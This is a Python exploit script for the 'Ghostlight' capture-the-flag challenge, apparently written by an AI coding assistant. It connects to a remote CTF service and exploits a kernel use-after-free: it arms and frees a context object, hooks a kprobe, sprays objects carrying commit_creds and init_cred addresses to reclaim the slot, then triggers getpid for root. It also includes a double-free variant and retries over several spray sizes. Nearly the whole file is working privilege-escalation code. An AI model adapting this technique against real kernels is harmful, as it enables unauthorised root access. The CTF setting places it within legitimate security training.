#!/usr/bin/env python3
"""
Author: Claude Code (AI Assistant)
Challenge: Ghostlight - Kernel Use-After-Free Exploitation
Purpose: Improved exploit based on source code analysis
Created: 2025-11-11

Key Findings:
- ghlight.c:60-107: GHOST_IOC_READFLAG handler is NOT in ghost_ioctl function!
- Only ARM, FREE, SPRAY, HOOKON, HOOKOFF are actually implemented
- Service MUST automatically detect and return flag after valid escalation

Vulnerability: UAF in GHOST_IOC_FREE (line 127 of ghostlight.c)
- gl_ctx is freed but not NULLed, creating dangling pointer
- kprobe handler at lines 39-45 still references gl_ctx after free

Exploitation Flow:
1. ARM: Allocate gl_ctx (struct glow, kmalloc-64, 48 bytes payload)
2. HOOKON: Register kprobe on __x64_sys_getpid
3. FREE: Free gl_ctx (UAF created, gl_ctx still points to freed memory)
4. SPRAY: Allocate objects with controlled fn/arg to reclaim freed slot
5. Trigger: Service internally triggers getpid() → kprobe fires
6. Execute: gl_ctx->fn(gl_ctx->arg) → commit_creds(&init_cred) → root
7. Result: Service detects elevation and returns flag
"""

import socket
import struct
import sys
import time
import os

# Kernel addresses from README
COMMIT_CREDS = 0xffffffffabcc5400
PREPARE_KERNEL_CRED = 0xffffffffabcc56b0
INIT_CRED = 0xffffffffad659a00

# Remote service
HOST = "exp200-3.pointeroverflowctf.com"
PORT = 14990

def send_cmd(sock, cmd):
    """Send a text command to the remote service"""
    sock.sendall(cmd.encode() + b'\n')
    print(f"[+] Sent: {cmd}")
    # Try to read immediate acknowledgment
    try:
        sock.settimeout(0.5)
        ack = sock.recv(1024)
        if ack:
            print(f"    Ack: {ack.decode().strip()}")
    except:
        pass

def test_connection():
    """Test basic connectivity and see what responses we get"""
    print(f"[*] Testing connection to {HOST}:{PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print("[+] Connected!")

    # Try various commands to see responses
    test_commands = [
        "arm 0x4141414141414141",
        "hookon",
        "spray 1 0x4141414141414141 0x4242424242424242",
        "free",
        "poke",
        "invalid_command_test"
    ]

    for cmd in test_commands:
        print(f"\n[*] Testing: {cmd}")
        sock.sendall(cmd.encode() + b'\n')
        try:
            sock.settimeout(1.0)
            response = sock.recv(4096)
            if response:
                print(f"[+] Response: {repr(response)}")
            else:
                print("[-] No response")
        except socket.timeout:
            print("[-] Timeout - no response")
        time.sleep(0.2)

    sock.close()
    print("\n[*] Connection closed")

def exploit_large_spray(spray_count=1500):
    """Exploit with large spray to improve heap reclamation reliability"""
    print(f"[*] Connecting to {HOST}:{PORT}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print("[+] Connected!")

    try:
        # Step 1: ARM - allocate gl_ctx
        print("\n[*] Step 1: ARM - Allocating gl_ctx")
        send_cmd(sock, "arm 0x4141414141414141")
        time.sleep(0.2)

        # Step 2: Enable hook before FREE to maximize UAF window
        print("\n[*] Step 2: HOOKON - Enabling kprobe")
        send_cmd(sock, "hookon")
        time.sleep(0.2)

        # Step 3: FREE - trigger UAF (gl_ctx now dangling)
        print("\n[*] Step 3: FREE - Creating use-after-free")
        send_cmd(sock, "free")
        time.sleep(0.2)

        # Step 4: Large SPRAY - reclaim memory with escalation payload
        print(f"\n[*] Step 4: SPRAY {spray_count} objects with escalation payload")
        print(f"    fn(commit_creds) = 0x{COMMIT_CREDS:016x}")
        print(f"    arg(&init_cred)  = 0x{INIT_CRED:016x}")
        send_cmd(sock, f"spray {spray_count} 0x{COMMIT_CREDS:x} 0x{INIT_CRED:x}")
        time.sleep(0.5)  # Allow spray to complete

        # Step 5: Trigger multiple times
        print("\n[*] Step 5: Trigger getpid multiple times")
        send_cmd(sock, "poke")
        time.sleep(0.2)
        send_cmd(sock, "poke")
        time.sleep(0.2)
        send_cmd(sock, "poke")
        time.sleep(0.2)

        # Step 6: EOF - signal completion and wait for flag
        print("\n[*] Step 6: Signal EOF for service to finalize")
        sock.shutdown(socket.SHUT_WR)

        # Wait for response
        print("\n[*] Waiting for service response...")
        sock.settimeout(10)
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                print(f"[+] Received chunk: {len(data)} bytes")
            except socket.timeout:
                print("[-] Timeout waiting for response")
                break

        print(f"\n[+] Total received: {len(response)} bytes")
        if response:
            print("[+] Response data:")
            print(repr(response))
            if b"POCTF{" in response:
                print("\n" + "="*60)
                print("SUCCESS: Flag found!")
                print("="*60)
                print(response.decode())
                return True

        return False

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        sock.close()
        print("\n[*] Connection closed")

def exploit_double_free():
    """Test alternative approach: FREE twice to increase UAF reliability"""
    print(f"[*] Connecting to {HOST}:{PORT} (double-free technique)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print("[+] Connected!")

    try:
        # ARM, FREE, ARM again to create double-free condition
        print("\n[*] Creating double-free for better exploitation")
        send_cmd(sock, "arm 0x4141414141414141")
        time.sleep(0.1)
        send_cmd(sock, "free")
        time.sleep(0.1)
        send_cmd(sock, "arm 0x4242424242424242")
        time.sleep(0.1)
        send_cmd(sock, "free")
        time.sleep(0.1)

        # Now spray
        print("\n[*] Spraying with escalation payload")
        send_cmd(sock, f"spray 2000 0x{COMMIT_CREDS:x} 0x{INIT_CRED:x}")
        time.sleep(0.5)

        # Hook and trigger
        send_cmd(sock, "hookon")
        time.sleep(0.1)
        send_cmd(sock, "poke")
        time.sleep(0.1)

        sock.shutdown(socket.SHUT_WR)

        response = sock.recv(8192)
        print(f"\n[+] Response: {repr(response)}")
        return b"POCTF{" in response

    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        sock.close()

def main():
    print("=" * 70)
    print("Ghostlight Exploit - Improved Version")
    print("=" * 70)
    print("\nAnalysis Summary:")
    print("- Vulnerability: UAF in GHOST_IOC_FREE (gl_ctx not NULLed)")
    print("- Exploitation: Spray to reclaim freed memory, trigger kprobe")
    print("- Payload: commit_creds(&init_cred) for privilege escalation")
    print("- Challenge: READFLAG ioctl NOT implemented, service auto-returns flag")
    print("=" * 70)

    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_connection()
        return

    if len(sys.argv) > 1 and sys.argv[1] == "double":
        success = exploit_double_free()
        return

    # Test various spray sizes
    spray_sizes = [500, 1000, 1500, 2000]

    for spray_size in spray_sizes:
        print(f"\n{'='*70}")
        print(f"ATTEMPT {spray_sizes.index(spray_size)+1}: Spray size = {spray_size}")
        print(f"{'='*70}")

        success = exploit_large_spray(spray_size)

        if success:
            print("\n" + "="*70)
            print("SUCCESS! Flag retrieved!")
            print("="*70)
            sys.exit(0)

        print(f"\n[-] Attempt with spray={spray_size} failed, trying next...")
        time.sleep(2)

    print("\n" + "="*70)
    print("[-] All attempts failed")
    print("="*70)
    print("\nPossible issues:")
    print("1. Heap spray not reclaiming exact freed slot")
    print("2. commit_creds(&init_cred) technique not working")
    print("3. Service wrapper has different implementation")
    print("4. Need alternative privilege escalation approach (ROP?)")
    print("5. Service may not detect privilege escalation properly")

if __name__ == "__main__":
    main()
